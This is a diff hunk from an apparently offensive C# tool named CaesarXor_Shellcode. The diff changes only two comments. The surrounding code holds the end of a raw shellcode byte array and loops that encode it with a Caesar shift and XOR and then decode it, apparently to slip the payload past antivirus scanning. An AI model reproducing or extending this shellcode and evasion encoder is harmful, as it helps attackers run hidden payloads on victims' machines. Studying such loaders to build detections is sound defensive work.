@@ -113,14 +113,14 @@ namespace CaesarXor_Shellcode
             0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,
             0x0a,0x41,0x89,0xda,0xff,0xd5 };
 
-            // Encrypt by shifting to the right (+) but you can go in either direction to start then XOR
+            // Encrypt by shifting to the right (+) but you can go in either direction to start then encrypt with XOR
             byte[] encBytes = new byte[payload.Length];
             for (int i = 0; i < payload.Length; i++)
             {
                 encBytes[i] = (byte)((((uint)payload[i] + sKey) & 0xFF) ^ xKey[0]);
             }
 
-            // Decrypt by XOR then shifting to the left (-) as long as it's the opposite of what you encrypted with
+            // Decrypt XOR then shift to the left (-) as long as it's the opposite of what you shifted to start
             byte[] decBytes = new byte[encBytes.Length];
             for (int i = 0; i < encBytes.Length; i++)
             {
